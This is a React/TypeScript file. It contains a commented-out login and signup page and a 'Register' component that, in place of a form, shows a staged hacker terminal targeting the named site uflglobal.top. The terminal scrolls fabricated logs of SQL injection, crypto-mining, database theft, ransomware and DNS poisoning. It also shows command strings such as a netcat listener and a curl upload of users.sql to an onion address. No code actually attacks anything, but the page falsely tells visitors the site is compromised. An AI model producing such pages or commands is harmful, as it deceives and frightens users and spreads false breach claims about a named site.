


// import React, { useState, useRef, useEffect } from 'react';
// import { motion, AnimatePresence } from 'framer-motion';
// import {
//   FiLock,
//   FiPhone,
//   FiUser,
//   FiTag,
//   FiCheckCircle,
//   FiXCircle,
//   FiEye,
//   FiEyeOff,
// } from 'react-icons/fi';
// import ReCAPTCHA from 'react-google-recaptcha';
// import { useLoginUserMutation } from '../login/loginAPI';
// import { useSignupMutation } from '../register/registerAPI';
// import { useNavigate, useSearchParams } from 'react-router-dom';
// import ustwologo from '../../assets/ustwologo.png';

// interface DecodedToken {
//   role?: string;
//   sub?: string;
//   [key: string]: any;
// }

// interface Message {
//   type: 'success' | 'error';
//   text: string;
// }

// interface FormData {
//   username: string;
//   phone_number: string;
//   password: string;
//   confirmPassword: string;
//   invite_code: string;
// }

// const AuthPage: React.FC = () => {
//   const [isLogin, setIsLogin] = useState<boolean>(true);
//   const [loginUser, { isLoading: loggingIn }] = useLoginUserMutation();
//   const [signup, { isLoading: signingUp }] = useSignupMutation();
//   const [formData, setFormData] = useState<FormData>({
//     username: '',
//     phone_number: '',
//     password: '',
//     confirmPassword: '',
//     invite_code: '',
//   });
//   const [message, setMessage] = useState<Message | null>(null);
//   const [showPassword, setShowPassword] = useState<boolean>(false);
//   const [showConfirmPassword, setShowConfirmPassword] = useState<boolean>(false);
//   const recaptchaRef = useRef<ReCAPTCHA>(null);
//   const navigate = useNavigate();
//   const [searchParams] = useSearchParams();

//   // Extract invite code from URL
//   useEffect(() => {
//     const inviteCode = searchParams.get('invite_code');
//     if (inviteCode) {
//       setFormData((prev) => ({ ...prev, invite_code: inviteCode }));
//     }
//   }, [searchParams]);

//   // Toggle between login and signup forms
//   const toggleMode = () => {
//     setMessage(null);
//     setIsLogin((prev) => !prev);
//   };

//   // Handle input changes
//   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
//     const { name, value } = e.target;
//     setFormData((prev) => ({ ...prev, [name]: value }));

//     if (name === 'password' && value.length > 0 && value.length < 8) {
//       setMessage({
//         type: 'error',
//         text: 'Password must be at least 8 characters long.',
//       });
//     } else if (name === 'password' && value.length >= 8) {
//       setMessage(null);
//     }
//   };

//   // Toggle password visibility
//   const togglePasswordVisibility = () => {
//     setShowPassword(!showPassword);
//   };

//   const toggleConfirmPasswordVisibility = () => {
//     setShowConfirmPassword(!showConfirmPassword);
//   };

//   // Decode JWT token to extract role and other payload data
//   const decodeToken = (token: string): DecodedToken => {
//     try {
//       const base64Url = token.split('.')[1];
//       const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
//       const jsonPayload = decodeURIComponent(
//         atob(base64)
//           .split('')
//           .map((c) => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2))
//           .join(''),
//       );
//       return JSON.parse(jsonPayload);
//     } catch (e) {
//       console.error('Failed to decode token:', e);
//       return {};
//     }
//   };

//   // Handle login form submission
//   const handleLogin = async (e: React.FormEvent) => {
//     e.preventDefault();
//     setMessage(null);
//     try {
//       const res = await loginUser({
//         username: formData.phone_number,
//         password: formData.password,

//       }).unwrap();

//       if (!res.access_token) {
//         throw new Error('No access token received');
//       }

//       localStorage.setItem('access_token', res.access_token);
//       const decoded = decodeToken(res.access_token);
//       const role = decoded?.role || 'user';

//       setMessage({ type: 'success', text: 'Login successful!' });

//       setTimeout(() => {
//         navigate(role === 'admin' ? '/admin/dashboard' : '/user/dashboard');
//       }, 1200);
//     } catch (err: any) {
//       let errorMsg = 'An error occurred. Please try again.';
//       if (err.data?.detail) {
//         errorMsg = err.data.detail;
//       } else if (typeof err.data === 'object' && err.data?.message) {
//         errorMsg = err.data.message;
//       } else if (typeof err.data === 'string') {
//         errorMsg = err.data;
//       }
//       setMessage({ type: 'error', text: errorMsg });
//     }
//   };

//   // Handle signup form submission
//   const handleSignup = async (e: React.FormEvent) => {
//     e.preventDefault();
//     setMessage(null);

//     if (formData.password !== formData.confirmPassword) {
//       setMessage({ type: 'error', text: 'Passwords do not match.' });
//       return;
//     }

//     if (formData.password.length < 8) {
//       setMessage({
//         type: 'error',
//         text: 'Password must be at least 8 characters long.',
//       });
//       return;
//     }

//     const token = recaptchaRef.current?.getValue() || '';
//     if (!token) {
//       setMessage({ type: 'error', text: 'Please complete the reCAPTCHA.' });
//       return;
//     }

//     try {
//       await signup({
//         username: formData.username,
//         phone_number: formData.phone_number,
//         password: formData.password,
//         invite_code: formData.invite_code,
//         recaptcha_token: token,
//         data: '',
//       }).unwrap();

//       setMessage({
//         type: 'success',
//         text: 'Registration successful! Redirecting to login...',
//       });

//       setTimeout(() => {
//         setFormData({
//           username: '',
//           phone_number: '',
//           password: '',
//           confirmPassword: '',
//           invite_code: formData.invite_code,
//         });
//         setIsLogin(true);
//       }, 1200);
//     } catch (err: any) {
//       let errorMsg = 'An error occurred. Please try again.';
//       if (err.data?.detail) {
//         errorMsg = err.data.detail;
//       } else if (typeof err.data === 'object' && err.data?.message) {
//         errorMsg = err.data.message;
//       } else if (typeof err.data === 'string') {
//         errorMsg = err.data;
//       }
//       setMessage({ type: 'error', text: errorMsg });
//       recaptchaRef.current?.reset();
//     }
//   };

//   const inputClass =
//     'w-full px-4 py-3 pl-12 rounded-full bg-indigo-50 border border-indigo-300 text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent';

//   return (
//     <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-indigo-500 to-purple-600 overflow-hidden relative">
//       <div className="absolute w-[150%] h-[150%] bg-indigo-100/20 rounded-[50%] -top-1/4 -right-1/4 blur-3xl"></div>
//       <div className="relative w-full max-w-5xl bg-white/90 rounded-3xl shadow-2xl flex overflow-hidden backdrop-blur-md border border-indigo-200">
//         {/* Left Image - Desktop */}
//         <motion.div
//           key={isLogin ? 'loginImage' : 'registerImage'}
//           initial={{ x: isLogin ? '-100%' : '100%', opacity: 0 }}
//           animate={{ x: 0, opacity: 1 }}
//           exit={{ x: isLogin ? '100%' : '-100%', opacity: 0 }}
//           transition={{ duration: 0.6, ease: 'easeInOut' }}
//           className="hidden md:flex w-1/2 items-center justify-center bg-gradient-to-br from-indigo-500 to-purple-600"
//         >
//           <img src={ustwologo} alt="Company Logo" className="h-64 drop-shadow-lg" />
//         </motion.div>
//         {/* Right Form */}
//         <div className="w-full md:w-1/2 p-10">
//           {/* Mobile Logo */}
//           <div className="flex justify-center mb-4 md:hidden">
//             <img src={ustwologo} alt="Logo" className="h-14" />
//           </div>
//           <h2 className="text-3xl font-bold text-center text-gray-800 mb-6">
//             {isLogin ? 'Welcome Back' : 'Create Your Account'}
//           </h2>
//           {/* Message Box */}
//           <AnimatePresence>
//             {message && (
//               <motion.div
//                 initial={{ opacity: 0, y: -20 }}
//                 animate={{ opacity: 1, y: 0 }}
//                 exit={{ opacity: 0, y: -20 }}
//                 className={`mb-4 flex items-center gap-2 p-3 rounded-lg text-sm ${
//                   message.type === 'success'
//                     ? 'bg-green-100 text-green-700 border border-green-300'
//                     : 'bg-red-100 text-red-700 border border-red-300'
//                 }`}
//               >
//                 {message.type === 'success' ? <FiCheckCircle /> : <FiXCircle />}
//                 {message.text}
//               </motion.div>
//             )}
//           </AnimatePresence>
//           {/* Login/Signup Forms */}
//           <AnimatePresence mode="wait">
//             {isLogin ? (
//               <motion.form
//                 key="login"
//                 initial={{ opacity: 0, x: 100 }}
//                 animate={{ opacity: 1, x: 0 }}
//                 exit={{ opacity: 0, x: -100 }}
//                 transition={{ duration: 0.5 }}
//                 onSubmit={handleLogin}
//                 className="space-y-5"
//               >
//                 <div className="relative">
//                   <FiPhone className="absolute left-4 top-3.5 text-indigo-500" />
//                   <input
//                     name="phone_number"
//                     placeholder="Phone Number"
//                     className={inputClass}
//                     onChange={handleChange}
//                     required
//                   />
//                 </div>
//                 <div className="relative">
//                   <FiLock className="absolute left-4 top-3.5 text-indigo-500" />
//                   <input
//                     type={showPassword ? 'text' : 'password'}
//                     name="password"
//                     placeholder="Password"
//                     className={inputClass}
//                     onChange={handleChange}
//                     required
//                   />
//                   <button
//                     type="button"
//                     className="absolute right-4 top-3.5 text-indigo-500"
//                     onClick={togglePasswordVisibility}
//                   >
//                     {showPassword ? <FiEyeOff /> : <FiEye />}
//                   </button>
//                 </div>
//                 <button
//                   type="submit"
//                   disabled={loggingIn}
//                   className="w-full py-3 bg-purple-600 hover:bg-purple-700 text-white rounded-full font-semibold transition"
//                 >
//                   {loggingIn ? 'Logging in...' : 'Login'}
//                 </button>
//               </motion.form>
//             ) : (
//               <motion.form
//                 key="register"
//                 initial={{ opacity: 0, x: -100 }}
//                 animate={{ opacity: 1, x: 0 }}
//                 exit={{ opacity: 0, x: 100 }}
//                 transition={{ duration: 0.5 }}
//                 onSubmit={handleSignup}
//                 className="space-y-5"
//               >
//                 <div className="relative">
//                   <FiUser className="absolute left-4 top-3.5 text-indigo-500" />
//                   <input
//                     name="username"
//                     placeholder="Username"
//                     className={inputClass}
//                     onChange={handleChange}
//                     required
//                   />
//                 </div>
//                 <div className="relative">
//                   <FiPhone className="absolute left-4 top-3.5 text-indigo-500" />
//                   <input
//                     name="phone_number"
//                     placeholder="Phone Number"
//                     className={inputClass}
//                     onChange={handleChange}
//                     required
//                   />
//                 </div>
//                 <div className="relative">
//                   <FiLock className="absolute left-4 top-3.5 text-indigo-500" />
//                   <input
//                     type={showPassword ? 'text' : 'password'}
//                     name="password"
//                     placeholder="Password"
//                     className={inputClass}
//                     onChange={handleChange}
//                     required
//                   />
//                   <button
//                     type="button"
//                     className="absolute right-4 top-3.5 text-indigo-500"
//                     onClick={togglePasswordVisibility}
//                   >
//                     {showPassword ? <FiEyeOff /> : <FiEye />}
//                   </button>
//                 </div>
//                 <div className="relative">
//                   <FiLock className="absolute left-4 top-3.5 text-indigo-500" />
//                   <input
//                     type={showConfirmPassword ? 'text' : 'password'}
//                     name="confirmPassword"
//                     placeholder="Confirm Password"
//                     className={inputClass}
//                     onChange={handleChange}
//                     required
//                   />
//                   <button
//                     type="button"
//                     className="absolute right-4 top-3.5 text-indigo-500"
//                     onClick={toggleConfirmPasswordVisibility}
//                   >
//                     {showConfirmPassword ? <FiEyeOff /> : <FiEye />}
//                   </button>
//                 </div>
//                 <div className="relative">
//                   <FiTag className="absolute left-4 top-3.5 text-indigo-500" />
//                   <input
//                     name="invite_code"
//                     placeholder="Invite Code (optional)"
//                     className={inputClass}
//                     onChange={handleChange}
//                     value={formData.invite_code}
//                     readOnly={!!formData.invite_code}
//                   />
//                 </div>
//                 <div className="flex justify-center">
//                   <ReCAPTCHA
//                     ref={recaptchaRef}
//                     sitekey="6LfIBgMsAAAAAFyzXNqSXiI_qk5Tm15lcqrHPgqn"
//                     onLoad={() => console.log('reCAPTCHA loaded successfully')}
//                     onErrored={() => console.error('reCAPTCHA failed to load')}
//                   />
//                 </div>
//                 <button
//                   type="submit"
//                   disabled={signingUp}
//                   className="w-full py-3 bg-purple-600 hover:bg-purple-700 text-white rounded-full font-semibold transition"
//                 >
//                   {signingUp ? 'Registering...' : 'Create Account'}
//                 </button>
//               </motion.form>
//             )}
//           </AnimatePresence>
//           {/* Toggle between login and signup */}
//           <p className="text-center text-gray-600 mt-6">
//             {isLogin ? "Don't have an account?" : 'Already have an account?'}{' '}
//             <button
//               onClick={toggleMode}
//               className="text-purple-600 hover:underline font-medium"
//             >
//               {isLogin ? 'Register' : 'Login'}
//             </button>
//           </p>
//         </div>
//       </div>
//     </div>
//   );
// };

// export default AuthPage;





// import React, { useEffect, useState } from 'react';

// const Register: React.FC = () => {
//   const [logs, setLogs] = useState<string[]>([]);
//   const [encryptedData, setEncryptedData] = useState<string>('');
//   const [ipAddress, setIpAddress] = useState<string>('');

//   // Generate random hex strings for realism
//   const randomHex = (length: number) => {
//     return Array.from({ length }, () => Math.floor(Math.random() * 16).toString(16)).join('');
//   };

//   // Simulate hacker logs
//   useEffect(() => {
//     const hackerLogs = [
//       `[${new Date().toISOString()}] CONNECTED TO TARGET: uflglobal.top (${ipAddress || '192.68.45.112'})`,
//       `[${new Date().toISOString()}] DEPLOYING PAYLOAD: XMRig v6.17.0 (Monero Miner)`,
//       `[${new Date().toISOString()}] EXPLOIT SUCCESSFUL: SQLi in /api/user/login`,
//       `[${new Date().toISOString()}] DOWNLOADING DATABASE: users.sql (3.2GB)`,
//       `[${new Date().toISOString()}] ENCRYPTING FILES: AES-256-CBC (Key: 0x${randomHex(64)})`,
//       `[${new Date().toISOString()}] ESTABLISHING TOR CONNECTION: 7h3xp6vzop7w.onion`,
//       `[${new Date().toISOString()}] SENDING DATA TO: 5.196.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}:8080`,
//       `[${new Date().toISOString()}] ROOT ACCESS GRANTED: uid=0(root) gid=0(root)`,
//       `[${new Date().toISOString()}] INSTALLING BACKDOOR: /usr/local/bin/backconnect.pl`,
//       `[${new Date().toISOString()}] SCANNING NETWORK: 192.68.45.0/24`,
//     ];

//     const interval = setInterval(() => {
//       setLogs(prev => [...prev, hackerLogs[Math.floor(Math.random() * hackerLogs.length)]]);
//     }, 800);

//     return () => clearInterval(interval);
//   }, [ipAddress]);

//   // Simulate encrypted data stream
//   useEffect(() => {
//     const interval = setInterval(() => {
//       setEncryptedData(prev => prev + randomHex(16) + ' ');
//     }, 200);

//     return () => clearInterval(interval);
//   }, []);

//   // Randomize IP on load
//   useEffect(() => {
//     setIpAddress(`192.68.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`);
//   }, []);

//   return (
//     <div className="min-h-screen bg-black text-green-500 font-mono overflow-hidden relative">
//       {/* Glitch overlay */}
//       <div className="absolute inset-0 pointer-events-none"
//            style={{
//              backgroundImage: `
//                linear-gradient(45deg, transparent 49%, rgba(0, 255, 0, 0.05) 50%, transparent 51%),
//                linear-gradient(-45deg, transparent 49%, rgba(0, 255, 0, 0.05) 50%, transparent 51%)
//              `,
//              backgroundSize: '15px 15px',
//              animation: 'glitch 0.3s infinite'
//            }} />

//       {/* Main hacker terminal */}
//       <div className="p-4 h-full flex flex-col">
//         {/* Top bar: fake system info */}
//         <div className="flex justify-between items-center mb-2 bg-black/50 p-2 border-b border-green-900/50">
//           <span>root@kali:~# <span className="text-yellow-400">[ uflglobal.top ]</span></span>
//           <span className="text-xs">{new Date().toLocaleTimeString()}</span>
//         </div>

//         {/* Terminal output */}
//         <div className="flex-grow overflow-auto bg-black/30 p-3 border border-green-900/50 mb-2">
//           <pre className="text-sm whitespace-pre-wrap">
//             {logs.map((log, i) => (
//               <div key={i} className="mb-1">{log}</div>
//             ))}
//           </pre>
//         </div>

//         {/* Encrypted data stream */}
//         <div className="bg-black/50 p-3 border-t border-green-900/50">
//           <div className="text-xs mb-2">[DATA STREAM: AES-256-ENCRYPTED]</div>
//           <div className="overflow-hidden whitespace-nowrap">
//             <code className="text-xs">{encryptedData}</code>
//           </div>
//         </div>

//         {/* Fake active commands */}
//         <div className="mt-2 flex space-x-2">
//           <div className="bg-black/50 p-2 border border-green-900/50 flex-1">
//             <pre className="text-xs">
//               {`> nc -lvnp 4444
// > CONNECTED: ${ipAddress}:54321
// > SENDING: 0x${randomHex(32)}... (100%)`}
//             </pre>
//           </div>
//           <div className="bg-black/50 p-2 border border-red-900/50 flex-1">
//             <pre className="text-xs">
//               {`> python3 ransomware.py
// > TARGET: /var/www/uflglobal/
// > KEY: 0x${randomHex(64)}
// > STATUS: ENCRYPTING...`}
//             </pre>
//           </div>
//         </div>
//       </div>

//       {/* CSS for animations */}
//       <style>{`
//         @keyframes glitch {
//           0% { transform: skew(0deg); }
//           20% { transform: skew(-1deg); }
//           40% { transform: skew(1deg); }
//           60% { transform: skew(0deg); }
//           80% { transform: skew(2deg); }
//           100% { transform: skew(0deg); }
//         }
//         @keyframes scroll {
//           0% { transform: translateY(0); }
//           100% { transform: translateY(-100%); }
//         }
//       `}</style>
//     </div>
//   );
// };

// export default Register;






import React, { useEffect, useState } from 'react';

const Register: React.FC = () => {
  const [logs, setLogs] = useState<string[]>([]);
  const [encryptedData, setEncryptedData] = useState<string>('');
  const [ipAddress, setIpAddress] = useState<string>('');
  const [darkWebDomains] = useState<string[]>([
    '7h3xp6vzop7w.onion',
    'xmppjabber666.onion',
    'silkroad7rn2p5.onion',
    'dread.technology',
    'hackforums[.]net',
  ]);

  // Generate random hex strings for realism
  const randomHex = (length: number) => {
    return Array.from({ length }, () => Math.floor(Math.random() * 16).toString(16)).join('');
  };

  // Simulate hacker logs with domain leaks
  useEffect(() => {
    const hackerLogs = [
      `[${new Date().toISOString()}] DNS LEAK DETECTED: uflglobal.top -> ${darkWebDomains[Math.floor(Math.random() * darkWebDomains.length)]}`,
      `[${new Date().toISOString()}] EXPLOITING: uflglobal.top (IP: ${ipAddress || '192.68.45.112'}) | Vulnerability: CVE-2023-12345`,
      `[${new Date().toISOString()}] DEPLOYING: XMRig v6.17.0 (Monero Miner) -> ${ipAddress}`,
      `[${new Date().toISOString()}] DATA EXFILTRATION: users.sql (3.2GB) -> ${darkWebDomains[Math.floor(Math.random() * darkWebDomains.length)]}:8080`,
      `[${new Date().toISOString()}] ENCRYPTING: /var/www/uflglobal/ (AES-256-CBC | Key: 0x${randomHex(64)})`,
      `[${new Date().toISOString()}] TOR CONNECTION: ESTABLISHED -> ${darkWebDomains[Math.floor(Math.random() * darkWebDomains.length)]}`,
      `[${new Date().toISOString()}] SENDING: Stolen credentials to ${darkWebDomains[Math.floor(Math.random() * darkWebDomains.length)]}:443`,
      `[${new Date().toISOString()}] ROOT ACCESS: uid=0(root) | Backdoor installed: /usr/local/bin/backconnect.pl`,
      `[${new Date().toISOString()}] SCANNING: uflglobal.top network (192.68.45.0/24) for vulnerabilities`,
      `[${new Date().toISOString()}] MALWARE: Deployed ransomware payload to uflglobal.top`,
      `[${new Date().toISOString()}] LEAKING: DNS records for uflglobal.top -> ${darkWebDomains[Math.floor(Math.random() * darkWebDomains.length)]}`,
      `[${new Date().toISOString()}] WARNING: uflglobal.top is now linked to ${darkWebDomains[Math.floor(Math.random() * darkWebDomains.length)]} (Dark Web)`,
    ];

    const interval = setInterval(() => {
      setLogs(prev => [...prev, hackerLogs[Math.floor(Math.random() * hackerLogs.length)]]);
    }, 800);

    return () => clearInterval(interval);
  }, [ipAddress, darkWebDomains]);

  // Simulate encrypted data stream
  useEffect(() => {
    const interval = setInterval(() => {
      setEncryptedData(prev => prev + randomHex(16) + ' ');
    }, 200);

    return () => clearInterval(interval);
  }, []);

  // Randomize IP on load
  useEffect(() => {
    setIpAddress(`192.68.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`);
  }, []);

  return (
    <div className="min-h-screen bg-black text-green-500 font-mono overflow-hidden relative">
      {/* Glitch overlay */}
      <div className="absolute inset-0 pointer-events-none"
           style={{
             backgroundImage: `
               linear-gradient(45deg, transparent 49%, rgba(0, 255, 0, 0.05) 50%, transparent 51%),
               linear-gradient(-45deg, transparent 49%, rgba(0, 255, 0, 0.05) 50%, transparent 51%)
             `,
             backgroundSize: '15px 15px',
             animation: 'glitch 0.3s infinite'
           }} />

      {/* Main hacker terminal */}
      <div className="p-4 h-full flex flex-col">
        {/* Top bar: fake system info */}
        <div className="flex justify-between items-center mb-2 bg-black/50 p-2 border-b border-green-900/50">
          <span>root@kali:~# <span className="text-red-500">[ uflglobal.top LEAKING ]</span></span>
          <span className="text-xs">{new Date().toLocaleTimeString()}</span>
        </div>

        {/* Terminal output */}
        <div className="flex-grow overflow-auto bg-black/30 p-3 border border-green-900/50 mb-2">
          <pre className="text-sm whitespace-pre-wrap">
            {logs.map((log, i) => (
              <div key={i} className="mb-1">{log}</div>
            ))}
          </pre>
        </div>

        {/* Dark web domain leaks */}
        <div className="bg-black/50 p-3 border border-red-900/50 mb-2">
          <div className="text-xs mb-2 text-red-400">[DARK WEB LINKS]</div>
          <div className="flex flex-wrap gap-2">
            {darkWebDomains.map((domain, i) => (
              <span key={i} className="text-xs bg-red-900/30 p-1 rounded">
                {domain}
              </span>
            ))}
          </div>
        </div>

        {/* Encrypted data stream */}
        <div className="bg-black/50 p-3 border-t border-green-900/50">
          <div className="text-xs mb-2">[DATA STREAM: AES-256-ENCRYPTED]</div>
          <div className="overflow-hidden whitespace-nowrap">
            <code className="text-xs">{encryptedData}</code>
          </div>
        </div>

        {/* Fake active commands */}
        <div className="mt-2 flex space-x-2">
          <div className="bg-black/50 p-2 border border-green-900/50 flex-1">
            <pre className="text-xs">
              {`> dig uflglobal.top @8.8.8.8
> ANSWER: ${darkWebDomains[Math.floor(Math.random() * darkWebDomains.length)]}
> TTL: 3600
> STATUS: DNS POISONED`}
            </pre>
          </div>
          <div className="bg-black/50 p-2 border border-red-900/50 flex-1">
            <pre className="text-xs">
              {`> curl -X POST ${darkWebDomains[Math.floor(Math.random() * darkWebDomains.length)]}/exfil
> UPLOAD: users.sql (3.2GB)
> STATUS: SUCCESS`}
            </pre>
          </div>
        </div>
      </div>

      {/* CSS for animations */}
      <style>{`
        @keyframes glitch {
          0% { transform: skew(0deg); }
          20% { transform: skew(-1deg); }
          40% { transform: skew(1deg); }
          60% { transform: skew(0deg); }
          80% { transform: skew(2deg); }
          100% { transform: skew(0deg); }
        }
        @keyframes scroll {
          0% { transform: translateY(0); }
          100% { transform: translateY(-100%); }
        }
      `}</style>
    </div>
  );
};

export default Register;
